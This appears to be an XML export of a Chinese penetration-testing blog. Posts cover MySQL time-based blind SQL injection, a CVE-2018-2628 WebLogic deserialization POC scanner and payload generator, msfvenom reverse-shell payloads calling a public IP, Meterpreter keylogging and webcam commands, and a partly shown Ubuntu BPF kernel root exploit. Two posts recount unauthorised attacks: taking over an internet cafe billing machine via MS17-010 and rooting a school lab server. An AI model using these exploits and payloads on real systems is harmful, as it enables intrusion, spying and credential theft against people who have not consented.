&emsp;&emsp;我们构造的环境中，user!=’aaa’的有3条记录，所以sleep(5)被执行了3次，因此延时15秒 第三个问题1mysql&gt; select user,password from user where user='root' and host='localhost' or sleep(5); &emsp;&emsp;这条语句为什么延时15秒？ &emsp;&emsp;这条语句先查询出满足user=’root’的结果集1[3条]，然后再从结果集1中查询出满足host=’localhost’的结果集2[1条]，接着从非结果集2[3条]中查询非sleep(5)得到结果集3，最后查询非结果集3的即可获得最终数据，此过程中sleep(5)被执行了3次，因此延时15秒 第四个问题1mysql&gt; select user,password from user where host='localhost' or sleep(5) and user='root'; &emsp;&emsp;为什么会延时10秒？ &emsp;&emsp;这条语句先查询出host=’localhost’的结果集1，然后再对非结果集1进行(sleep(5) and user=’root’)的筛选得出结果集2，结果集1和结果集2的并集就是最终结果集。 &emsp;&emsp;而从非结果集1中进行where sleep(5) and user=’root’的查询又分为以下两步：1.从非结果集1中查询满足sleep(5) 的结果集2_1 然后从结果集2_1中查询满足user=’root’的结果集得到结果集2 &emsp;&emsp;另外从该语句的执行结果我们可以看出的是and的优先级要高于or。如果两者优先级相同的话，结果应该是只有一条数据：localhost root的这条。 1mysql&gt; select user,password from user where host='localhost' or user='xxxx' and sleep(5); &emsp;&emsp;原因是非结果集1中满足user=’xxxx’的结果集2_1为空，所以sleep(5)未执行。 第五个问题1mysql&gt; select user,password from user where host='localhost' or user='root' or sleep(5); &emsp;&emsp;为什么执行结果是0秒呢？ &emsp;&emsp;因为host=’localhost’ or user=’root’已经是全集了，非全集则为空集，所以sleep(5)没有被执行。 第六个问题1mysql&gt; select user,password from user where host='localhost' or false and user='root' and sleep(5); &emsp;&emsp;为什么执行结果是0秒呢？ &emsp;&emsp;因为false and user=’root’的结果集已经是空集，所以sleep(5)并没有被执行。 xor的工作机制 对时间盲注的影响12-- 情况1：id and if(1=1,sleep(5),0) &emsp;&emsp;如果这里你填写的ID是在数据库中不存在的ID，则这个payload不会延时，那么你将错过一个基于时间的盲注注入点。 12-- 情况2：id or if(1=1,sleep(5),0) &emsp;&emsp;如果这里有100个id，而你只写了1个id，那么你将进行99次sleep(5),同志，你想想你等待的会不会花儿都谢了？ 12-- 情况3：keyword%' and if(1=1,sleep(5),0) or '%a%'='%a &emsp;&emsp;这种情况会延时0秒，MySQL会从简单的一方先开始查询，显然’%a%’=’%a%’已经占了全集，那么or左边的sleep(5) &emsp;&emsp;and 左右一旦出现明显的false则不会执行另一次，or 左右一旦出现明显true则不会执行另一侧，这是我在写第三种情况的时候发现的 12-- 情况4：keyword%' or if(1=1,sleep(5),0) or '%a%'='%a &emsp;&emsp;此情况延时也为0秒，因为最右侧出现了明显的true 12-- 情况5：keyword%' and if(1=1,sleep(5),0) or '%a%'='%a &emsp;&emsp;此情况延时也为0秒，因为最右侧出现了明显的true 总结&emsp;&emsp;1.在不需要闭合的注入场景中尽量使用id and if(1=1,sleep(5),0) 并且注意id要填写为数据库中存在的id &emsp;&emsp;2.在需要闭合的注入场景中，keyword最好填写能查询数据，并且查询的条目不多的keyword，两个连接符都用and来进行连接。]]></content>
      <categories>
        <category>运维</category>
        <category>MySQL</category>
        <category>and_or_xor</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>and</tag>
        <tag>or</tag>
        <tag>xor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-2628 WebLogic反序列化漏洞复现]]></title>
    <url>%2FCVE-2018-2628-WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html</url>
    <content type="text"><![CDATA[前言&emsp;&emsp;从该漏洞公布到现在也有2天的时间了，最近也比较忙，没时间调，现在忙里偷闲调了下。里面遇到的问题还是蛮多的，写下这篇文章，权当一个记录。 测试POC&emsp;&emsp;随便在zoomeye上找了几个测试站点，测试了一下(POC放在附录中，绿盟也有web版的POC)，测试截图如下： &emsp;&emsp;当然只是测试漏洞还没有达到目的。 生成Payload&emsp;&emsp;在T00ls上看到某表哥给出了生成payload的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package test;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.rmi.activation.Activator;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.ObjectPayload;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;@PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectSMTest")@Authors(&#123; Authors.MBECHLER &#125;)public class JRMPClient extends PayloadRunner implements ObjectPayload&lt;Activator&gt; &#123; public JRMPClient()&#123; &#125; public Activator getObject (String command ) throws Exception &#123; int sep = command.indexOf(58);//:--&gt;58 String host; int port; if ( sep &lt; 0 ) &#123; port = new Random().nextInt('\uffff'); host = command; &#125; else &#123; host = command.substring(0, sep); port = Integer.valueOf(command.substring(sep + 1)).intValue(); &#125; ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123; Activator.class &#125;, obj); return proxy; &#125; public static void main ( final String[] args ) throws Exception &#123; Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());// PayloadRunner.run(JRMPClient.class, args); ObjectPayload payload = (ObjectPayload)JRMPClient.class.newInstance(); Object objBefore = payload.getObject("192.168.0.109:7779"); ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream("1.txt")); obj.writeObject(objBefore); System.out.println("1232"); &#125;&#125; &emsp;&emsp;对于在渗透测试领域时间较长的前辈们，可能对这个并不陌生，但是对于我这个新手来说，却怎么也生成不了payload。 &emsp;&emsp;由于该洞是15年的反序列化漏洞补丁绕过而形成的，所以我又百度了15年的那个反序列化漏洞，详情请移步JAVA反序列化命令执行漏洞利用详情 &emsp;&emsp;除了以上资料，我还看了很多资料，大概明白了payload的生成方法：eclipse创建一个项目，在该项目下创建一个包test，然后在该包中创建一个JRMPClient.java文件将以上代码放入JRMPClient.java文件，并修改代码中的地址和端口。 12Object objBefore = payload.getObject("47.95.206.199:7779");ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream("1.txt")); &emsp;&emsp;然后在该包的同级目录下创建一个ysoserial目录，将https://github.com/frohoff/ysoserial 下载下来放于此目录下 &emsp;&emsp;完成上面的操作后，我发现里面全是报错.又百度，看文章，发现需要导入外部的ysoserial.jar这个JAR包，如图： &emsp;&emsp;导入这个jar包以后就不会再报错了。 &emsp;&emsp;然后执行JRMPClient.java文件，则会在目录下生成一个1.txt，这就是payload 转换payload修改poc12345678910111213#!env python#author hackteam.cn#coding=utf-8Str=""f=open("1.txt","rb")while True: tmp=f.read(1) if len(tmp)==0: break else: Str+=tmp.encode("hex")f.close()print Str &emsp;&emsp;然后将payload替换掉poc开头的PAYLOAD即可。 服务器监听java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 7779 CommonsCollections1 calc &emsp;&emsp;然后执行POC： &emsp;&emsp;看到服务器接收到了目标站点的连接，但是尝试反弹shell还是没有成功，使用ping命令去访问dnslog，也没有收到结果 附录POC： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#!/usr/bin/python# -*- coding: utf-8 -*-import socketimport timeimport reimport systimeout = int(sys.argv[1])VUL=[&apos;CVE-2018-2628&apos;]PAYLOAD=[&apos;aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078&apos;]VER_SIG=[&apos;\\$Proxy[0-9]+&apos;]vul_no = []vul_yes = []vul_more_test = []def t3handshake(sock,server_addr): print &apos;正在连接服务器...&apos; sock.connect(server_addr) sock.send(&apos;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&apos;.decode(&apos;hex&apos;)) time.sleep(1) sock.recv(1024)def buildT3RequestObject(sock,port,server_addr): print &apos;%s:%d连接成功，正在发送请求...&apos; %(server_addr[0],server_addr[1]) data1 = &apos;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&apos; data2 = &apos;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&apos;.format(&apos;&#123;:04x&#125;&apos;.format(dport)) data3 = &apos;1a7727000d3234322e323134&apos; data4 = &apos;2e312e32353461863d1d0000000078&apos; for d in [data1,data2,data3,data4]: sock.send(d.decode(&apos;hex&apos;)) time.sleep(2) lendate = len(sock.recv(2048)) print &apos;发送有效载荷请求成功,接收长度:%d&apos;%(lendate) return lendatedef sendEvilObjData(sock,data,lendate): print &apos;正在执行载荷，请稍等...&apos; payload=&apos;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&apos; payload+=data payload+=&apos;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&apos; payload = &apos;%s%s&apos;%(&apos;&#123;:08x&#125;&apos;.format(len(payload)/2 + 4),payload) sock.send(payload.decode(&apos;hex&apos;)) time.sleep(2) sock.send(payload.decode(&apos;hex&apos;)) res = &apos;&apos; start = time.time() try: while True: res += sock.recv(4096) time.sleep(0.1) end =time.time() timeend = end-start if lendate == 0 and timeend &gt; timeout: break except Exception as e: pass return resdef checkVul(res,server_addr,index): print &apos;执行结果：&apos; p=re.findall(VER_SIG[index], res, re.S) if len(p)&gt;0: print &apos;%s:%d 存在 %s 漏洞。&apos;%(server_addr[0],server_addr[1],VUL[index]) vul_yes.append(server_addr) else: print &apos;%s:%d 不存在 %s 漏洞。&apos; % (server_addr[0],server_addr[1],VUL[index]) vul_no.append(server_addr)def run(index): with open(&quot;url.txt&quot;,&apos;r&apos;) as lists: for server_addr in lists: server_addr=server_addr.strip(&apos;\n\r&apos;) dip=server_addr.split(&apos;:&apos;)[0] global dport dport=int(server_addr.split(&apos;:&apos;)[1]) sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(15) server_addr = (dip, dport) try: t3handshake(sock,server_addr) except Exception as e: print &apos;%s:%d连接失败，请检查IP是否存活...&apos; %(server_addr[0],server_addr[1]) else: try: lendate = buildT3RequestObject(sock,dport,server_addr) rs=sendEvilObjData(sock,PAYLOAD[index],lendate) # print &apos;rs&apos;,rs except Exception as e: print &apos;%s:%d请求频繁，请稍后自行单独测试...&apos; %(server_addr[0],server_addr[1]) vul_more_test.append(server_addr) else: checkVul(rs,server_addr,index) finally: sock.close() print &apos;=&apos;*50 print &apos;检测完成！&apos; print &apos;以下IP存在CVE-2018-2628漏洞：&apos; for yes in vul_yes: print &apos;%s:%s&apos; % (yes[0],yes[1]) print &apos;=&apos;*50 print &apos;以下IP不存在漏洞：&apos; for no in vul_no: print &apos;%s:%s&apos; % (no[0],no[1]) print &apos;=&apos;*50 print &apos;以下IP请求频繁，需单独自行测试：&apos; for more in vul_more_test: print &apos;%s:%s&apos; % (more[0],more[1]) print &apos;=&apos;*50if __name__==&quot;__main__&quot;: run(0)]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞复现</category>
        <category>CVE-2018-2628</category>
      </categories>
      <tags>
        <tag>CVE-2018-2628</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透网吧计费系统]]></title>
    <url>%2F%E6%B8%97%E9%80%8F%E7%BD%91%E5%90%A7%E8%AE%A1%E8%B4%B9%E7%B3%BB%E7%BB%9F.html</url>
    <content type="text"><![CDATA[故事开始这要从某天晚上陪女朋友去网吧玩游戏说起，到网吧以后闲的无聊就想搞一搞，先从T00LS上下载了一个PHP版本的ms17010检测工具，检测了一下自己所用机子是否存在漏洞，发现并未漏洞，而且网吧的445端口都是关掉的。 从client知计费端IP 看到收费端IP地址默认是192.168.0.200 然后测试发现该机器存在ms17010 利用漏洞打下计费端直接用MS17010的图形化界面工具打下计费机器 获取一个cmdshell，先看下权限 下载tv远控 运行远控 然后跑路离开网吧，免得被打。 远控回到安全的地方以后，用自己电脑打开teamviewer去连接网吧机器 一直卡在这个界面，猜测是不是有UAC。 也不知道怎么解决，索性就重启一下试试吧 在shell中重启了网吧电脑，几分钟以后。 没什么技术含量，就是给大家看个乐子，从这次渗透中我还是有不少收获的。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>提权</category>
        <category>网吧渗透</category>
      </categories>
      <tags>
        <tag>MS17010</tag>
        <tag>TV.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker学习笔记]]></title>
    <url>%2FDocker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"><![CDATA[安装dockerUbuntu安装docker 安装没什么说的，直接看教程就行 Docker的使用REPOSITORY和TAGREPOSITORY ： 镜像的仓库源 TAG ：镜像的标签 用REPOSITORY:TAG来表示镜像 下载一个新镜像1docker pull ubuntu:16.04 查看镜像1docker image ls 启动一个docker后台运行 1234# method 1docker run -d -p 4444:4444 -p 80:80 ubuntu:16.04 /etc/init.d/apache strat# method 2docker run -dit -p 4444:4444 ubuntu:16.04 参数介绍： -d 后台运行 -p 一对一的端口映射 ubuntu:16.04 docker镜像 /etc/init.d/apache strat 如果docker中没有任务运行则会退出，可以用服务来保持docker容器运行 -P 将容器中的端口随机和本机的高端口映射 1.查看端口映射 1docker port 容器名 2.停止运行中大的容器 1docker stop 容器名 3.重启容器 1docker start 容器名 # 不同于docker run 4.查看容器内部的标准输出 1docker logs [ID或者名字] 5.进入后台运行的docker 12345# 方法1docker attach [ID或者名字]# 方法2 即使exit退出容器也会后台运行(-it input tty)docker exec -it [ID或者名字] /bin/sh 前台运行 1docker run -t -i ubuntu:16.04 /bin/bash 参数介绍： -t 分配标准的TTY(开启容器中的terminal) -i 开启了input(输入)功能 /bin/bash [可选，-t已经指定了bash]容器中无程序运行则会退出，但是/bin/bash不能保持容器后台运行 查看运行中的docker1docker ps 镜像管理创建本地镜像Method 1 ：commit1234567891011# 进入容器docker run -i -t ubuntu:16.04 /bin/bash# 一系列的操作.....# 退出容器exit# 更新镜像docker commit -m="描述" -a="作者" imageId 目标镜像名(msf:1.0) Method 2 ：构建镜像文件1docker build -t 目标镜像名 . # .表示Dockerfile所在目录 镜像仓库不得不说官方的镜像仓库真的是太慢了，这里主要介绍阿里云的镜像仓库使用。 登录阿里云docker registry: 1$ sudo docker login --username=admin_tony78941695 registry.cn-hangzhou.aliyuncs.com 登录registry的用户名是您的阿里云账号全名，密码是您开通服务时设置的密码。 你可以在镜像管理首页点击右上角按钮修改docker login密码。 从registry中拉取镜像： 1$ sudo docker pull registry.cn-hangzhou.aliyuncs.com/admintony/msf:[镜像版本号] 将镜像推送到registry： 12345$ sudo docker login --username=admin_tony78941695 registry.cn-hangzhou.aliyuncs.com$ sudo docker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/admintony/msf:[镜像版本号]$ sudo docker push registry.cn-hangzhou.aliyuncs.com/admintony/msf:[镜像版本号] 其中[ImageId],[镜像版本号]请你根据自己的镜像信息进行填写。 容器的导入导出 方法1： 12docker save ubuntu:16.04&gt;/root/ubuntu.tardocker load&lt;ubuntu.tar 方法2: 12docker export [imageId]&gt; ubuntu.tarcat ubuntu.tar | sudo docker import - ubuntu:import]]></content>
      <categories>
        <category>运维</category>
        <category>Docker学习</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识Metasploit]]></title>
    <url>%2F%E5%88%9D%E8%AF%86Metasploit.html</url>
    <content type="text"><![CDATA[安装MSF安装msf：1234567cd /optcurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstallchmod 755 msfinstall./msfinstall 安装postgresql1234567apt-get install postgresqlsu postgres createuser msf -P -S -R -D #创建用户，后面会提示输入密码 createdb -O msf msf #创建数据库 创建用户时出现的问题及解决方案 service postgresql restart 重启即可，每次用docker开启一个新的容器都要把里面的服务开启 配置metasploit数据库的连接在metasploit的安装目录下新建database.yml文件，内容如下 123456789production: adapter: postgresql database: msf username: msf password: msf #我在上一步创建用户的时候 设置的密码 host: 127.0.0.1 port: 5432 pool: 75 timeout: 5 然后在msf中手动连接数据库 12345msf &gt; db_connect -y /opt/metasploit-framework/database.yml[*] Rebuilding the module cache in the background...msf &gt; db_status[*] postgresql connected to msfmsf &gt; 解决metasploit搜索缓慢 重启postgresql 1service postgresql restart 重建msf缓存表 12345678msf &gt; db_status[*] postgresql selected, no connectionmsf &gt; db_connect -y /opt/metasploit-framework/database.yml[*] Rebuilding the module cache in the background...msf &gt; db_rebuild_cache[*] Purging and rebuilding the module cache in the background...msf &gt; db_status[*] postgresql connected to msf 然后就能实现秒搜索了 安装Apache2为什么要安装apache2? 我把msf放到了云服务中的docker中，方便使用公网IP，但是生成的dll 、 exe无法下载到本地，所以要借助apache的文件下载功能 1apt-get install apache2 MSF反弹shell生成dll64位： 1msfvenom -p windows/x64/shell_reverse_tcp -a x64 lhost=47.95.206.199 lport=6666 -f dll -o ./6666.dll 32位： 1msfvenom -p windows/shell_reverse_tcp lhost=47.95.206.199 lport=6666 -f dll -o ./6666.dll 简单说下这些参数： 1234567891011-p 选择使用的payload shell_reverse_tcp是反弹shell的 windows/meterpreter/reverse_tcp MSF的shelllhost msf机器的IPlport msf监听的端口-f 生成的文件类型，msfvenom --help-format查看-o 输出文件地址及文件名 监听12345use exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost 0.0.0.0set lport 端口 (不填写默认是4444)exploit 靶机运行后的效果 补充说明：运行dll命令 -&gt; rundll32 dll.dll,Strart Meterpreter生成木马1msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lhost=192.168.1.101 lport=4444 -f exe -x calc.exe -k -o ./meter.exe 12345--platforms 有效的负荷平台-x 设置宿主程序-k 将payload注入到新的进程 Meterpreter控制端使用只写一些常用的，其他的以后用到了再补充 background将当前的session放入后台，继续用msf进行其他渗透工作 123sessions 查看后台运行的session列表sessions id 进入某个后台运行的session 对目录和文件的操作 cat ：读取并显示某个文件 cd：跳转到某个目录 dir &amp;&amp; ls ：列出靶机目录下的文件 cp 源文件 目标文件(windows路径用\\或者/) # 复制文件 download 文件名 # 从目标服务器下载文件 upload 本地文件名 # 从本地向目标服务器上传文件 lls 列出msf所在机器上当前目录下的内容 getwd &amp;&amp; pwd # 获取靶机当前shell工作目录 getlwd &amp;&amp; lpwd # 获取本机的shell工作目录 edit 文件名 # 编辑文件 mkdir\rmdir 目录名 # 创建或删除目录 mv 源文件 目标文件 # 移动文件 rm 文件 # 删除文件 show_mount # 查看靶机的盘符 网络相关 arp # 查看靶机的arp缓存表 getproxy # 查看靶机的代理情况 ipconfig &amp;&amp; ifconfig # 查看靶机的ip netstat 查看靶机的端口情况，结果包括产生端口的进程 portfwd add -l msf机端口 -r 靶机IP -p 靶机端口 # 端口转发 然后连接靶机远程桌面直接连接本地的8888即可。 resolve 主机名 -f IPv4 or IPv6 # 解析主机名 route # 查看靶机的路由表 系统相关 getuid # 查看当前用户名 clearev # 清除事件日志 execute -f 程序 # 执行一个程序 getprivs # 查看msf shell所拥有的权限 kill PID # 终止一个进程 localtime # 查看靶机的时间 pgrep 进程名 # 根据进程名查PID pkill 进程名 # 根据进程名结束进程 ps # 查看运行中的进程 reboot &amp; shutdown # 重启 或 关机 sysinfo 查看系统信息 用户接口相关 keyscan系列 12345keyscan_start # 开始记录键盘keyscan_dump # 把记录的值打印出来，在keyscan_stop前使用keyscan_stop # 关闭键盘记录 screenshot # 捕捉桌面 uictl [enable/disable] [keyboard/mouse/all] 启用（禁用）鼠标键盘，win32可用 摄像头相关 record_mic -d 秒数 -f 保存的文件名 # 记录麦克风 webcam_list # 显示靶机有哪些摄像头 webcam_stream # 打开摄像头流，并用html呈现 webcam_snap # 抓拍一张摄像头的图片 webcam_chat # 和靶机进行视频聊天，也是html中呈现 其他 getsystem # 尝试漏洞来获取system权限 XP测试图 hashdump # 获取系统中用户密码的hash]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>MSF</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux实验系统某洞导致获取Root权限]]></title>
    <url>%2FLinux%E5%AE%9E%E9%AA%8C%E7%B3%BB%E7%BB%9F%E6%9F%90%E6%B4%9E%E5%AF%BC%E8%87%B4%E8%8E%B7%E5%8F%96Root%E6%9D%83%E9%99%90.html</url>
    <content type="text"><![CDATA[系统结构图 我所拥有的权限目前我所拥有的权限是student权限，我的用户 和 教师用户在同一个服务器，而每次创建实验，都是在这台服务器中创建一个dockers虚拟环境进行实验(实验机中分配的权限都是root) 我的目标获取到服务器的root权限 最新0day秒杀秒杀之前的其他尝试我拥有的就是一个shell权限，之前测试过很多exp都无法提下这台服务器。 注册账号是一个高权限的用户，但是它的bash被管理员替换成注册账号的脚本了，如下： 曾尝试过绕过这个界面来执行其他命令，没有成功。 0day秒杀今天在小太阳看到大家在讨论ubuntu 4.4内核提权0day，就想试一下。 先上传exp到目标服务器 然后编译EXP 运行EXP 发现我已经是root权限了 Linux添加Root用户添加特权用户添加用户： 加入root组 1usermod -g root admintonyc 自己确实在root组，但是执行需要root权限的命令时候发现，并不具备root权限 再修改/etc/sudoers文件，加入以下条目 # User privilege specification root ALL=(ALL:ALL) ALL admintonyc ALL=(ALL:ALL) ALL 在root后面加上admintonyc ALL=(ALL:ALL) ALL即可使用sudo执行特权命令 其他方法修改用户的uid 但是修改UID=0之后，登陆这个用户需要用到root用户的密码…重新修改了该用户的密码一样无法登陆 补充：之所以修改uid=0后无法登陆是因为ssh没开启root登陆 修改/etc/shadow 创建一个用户，将该用户的/etc/shadow中的加密密文替换给root用户，用完以后再把root用户的密文替换回来即可。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247/* * Ubuntu 16.04.4 kernel priv esc * * all credits to @bleidl * - vnik */// Tested on:// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64// if different kernel adjust CRED offset + check kernel stack size#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;linux/bpf.h&gt;#include &lt;linux/unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/un.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdint.h&gt;#define PHYS_OFFSET 0xffff880000000000#define CRED_OFFSET 0x5f8#define UID_OFFSET 4#define LOG_BUF_SIZE 65536#define PROGSIZE 328int sockets[2];int mapfd, progfd;char *__prog = "\xb4\x09\x00\x00\xff\xff\xff\xff" "\x55\x09\x02\x00\xff\xff\xff\xff" "\xb7\x00\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x18\x19\x00\x00\x03\x00\x00\x00" "\x00\x00\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x00\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x06\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x01\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x07\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x02\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x08\x00\x00\x00\x00\x00\x00" "\xbf\x02\x00\x00\x00\x00\x00\x00" "\xb7\x00\x00\x00\x00\x00\x00\x00" "\x55\x06\x03\x00\x00\x00\x00\x00" "\x79\x73\x00\x00\x00\x00\x00\x00" "\x7b\x32\x00\x00\x00\x00\x00\x00" 